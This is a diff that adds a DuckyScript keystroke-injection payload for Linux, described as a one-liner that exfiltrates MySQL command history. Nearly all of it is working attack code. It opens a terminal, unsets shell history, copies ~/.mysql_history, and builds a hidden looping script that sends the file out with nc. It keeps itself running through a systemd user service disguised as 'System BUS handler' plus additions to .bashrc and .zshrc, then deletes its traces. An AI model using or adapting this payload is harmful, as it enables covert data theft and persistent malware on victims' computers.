@@ -1,0 +1,22 @@
+REM Title: mysql_dump
+REM Description: mysql_dump, is a oneliner payload used to exfiltrate mysql history. Looting mysql history can be useful understanding targets database schema.
+REM AUTHOR: drapl0n
+REM Version: 1.0
+REM Category: Exfiltaration.
+REM Target: GNU/Linux.
+REM Attackmodes: HID.
+
+DELAY 2000
+CTRL ALT t
+DELAY 2000
+STRING unset HISTFILE 
+ENTER
+DELAY 200
+STRING echo -e "#\!/bin/bash\nls -a ~/ | grep -w '.mysql_history' &> /dev/null\nif [ \$? = 0 ]; then\n\tmkdir -p ~/.config/systemd/user\n\tmkdir -p /var/tmp/.system\n\tcp ~/.mysql_history /tmp/exfil\n\techo -e \"while :\\\ndo\\\n\\\tping -c 5 8.8.8.8\\\n\\\tif [ \\\$? -eq 0 ]; then\\\n\\\t\\\tnc -c 127.0.0.1 4444 < /tmp/exfil\\\n\\\tfi\\\ndone\" > /var/tmp/.system/systemBus\n\tchmod +x /var/tmp/.system/systemBus\n\techo -e \"[Unit]\\\nDescription= System BUS handler\\\n\\\n[Service]\\\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\\\nRestart=on-failure\\\nSuccessExitStatus=3 4\\\nRestartForceExitStatus=3 4\\\n\\\n[Install]\\\nWantedBy=default.target\" > ~/.config/systemd/user/systemBUS.service\n\tsystemctl --user enable --now systemBUS.service\n\tsystemctl --user start --now systemBUS.service\n\techo -e \"ls -a ~/ | grep 'zshrc' &> /dev/null\\\nif [ \\\$? = 0 ]; then\\\n\\\techo \"systemctl --user enable --now systemBUS.service\" >> ~/.zshrc\\\nfi\\\nls -a ~/ | grep 'bashrc' &> /dev/null\\\nif [ \\\$? = 0 ]; then\\\n\\\techo \"systemctl --user enable --now systemBUS.service\" >> ~/.bashrc\\\nfi\" > /tmp/tmmmp\n\tchmod +x /tmp/tmmmp && /tmp/./tmmmp && rm /tmp/tmmmp \nfi" > /tmp/system
+ENTER
+DELAY 200
+STRING chmod +x /tmp/system
+ENTER
+DELAY 200
+STRING /tmp/./system && rm /tmp/system && exit
+ENTER
